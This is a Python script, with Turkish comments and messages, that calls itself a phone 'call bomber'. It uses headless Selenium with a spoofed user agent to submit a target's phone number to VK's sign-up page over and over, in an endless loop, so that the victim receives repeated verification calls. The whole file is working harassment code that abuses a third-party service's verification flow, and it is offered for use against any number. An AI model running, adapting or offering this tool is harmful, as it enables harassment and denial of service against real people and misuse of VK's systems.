# Created by baycpp
# Instagram: bay.cpp
# Discord: baycpp

import argparse
import platform
from os import system
from time import sleep
from selenium import webdriver
from colorama import Fore, init
from fake_useragent import UserAgent
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
init(autoreset="true")

def banner():
    if platform.system() == "Linux":
        system("clear")
    else:
        system("cls")

    print(Fore.RED + """
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█ Author: baycpp
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░ Instagram: bay.cpp
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░ Version: 1.2
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
""")

def selenium_settings():
    global browser

    ua = UserAgent()
    service = Service()
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument(f"user-agent={ua.chrome}")
    browser = webdriver.Chrome(service=service, options=options)
    browser.get("https://id.vk.com/auth?app_id=7913379&response_type=silent_token&v=1.60.6&redirect_uri=https%3A%2F%2Fvk.com%2Fjoin&uuid=5Wp81LojdWssJNjdwA5II&scheme=space_gray&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl91cCJ9fQ%3D%3D")
    sleep(2)

def call_bomb(phone_number, sayac):
    print(Fore.RED + "\nHEDEF TELEFON NUMARASINA ARAMA GÖNDERİLİYOR!")
    print(Fore.GREEN + f"Hedef telefon numarası: {phone_number}")
    print(Fore.GREEN + f"Gönderilen arama: {sayac}", end='\r')
    sayac += 1

    number_input = browser.find_element("xpath", '//*[@id="root"]/div/div/div/div/div[1]/div[2]/div/div/div/form/div[1]/section/div[1]/div/div/input')
    number_input.send_keys(Keys.CONTROL + "a")
    number_input.send_keys(Keys.DELETE)
    sleep(2)
    number_input.send_keys(phone_number)
    browser.find_element("xpath", '//*[@id="root"]/div/div/div/div/div[1]/div/div/div/div/form/div[2]/div[1]/button').click()

if __name__ == "__main__":
    sayac = 0

    parser = argparse.ArgumentParser()

    # Argüman ekle
    parser.add_argument('-p', '--phone', type=str, nargs=1, help='Hedef telefon numarasını belirtmek için kullanılır.')
    parser.add_argument('-c', '--call', action="store_true", help='Hedef telefon numarasına arama yapılacağını belirtmek için kullanılır.')
    parser.add_argument('-s', '--sms', action="store_true", help='Hedef telefon numarasına sms gönderileceğini belirtmek için kullanılır.')

    # Argümanları parse et
    args = parser.parse_args()

    # -c parametresi belirtilmemişse
    if not args.call:
        banner()
        parser.print_help()

    else:
        # Argümanlara göre işlemleri gerçekleştir
        if args.phone:
            phone_number = args.phone[0]

            if not phone_number.startswith("90"):
                phone_number = "90" + phone_number

            try:
                while True:
                    banner()
                    selenium_settings()
                    call_bomb(phone_number, sayac)
                    sayac += 1
                    sleep(2)
            except KeyboardInterrupt:
                print("\nCtrl-c tuşlarına basıldı. Program sonlandırılıyor...\n")
                browser.quit()
                exit()

        else:
            banner()
            parser.print_help()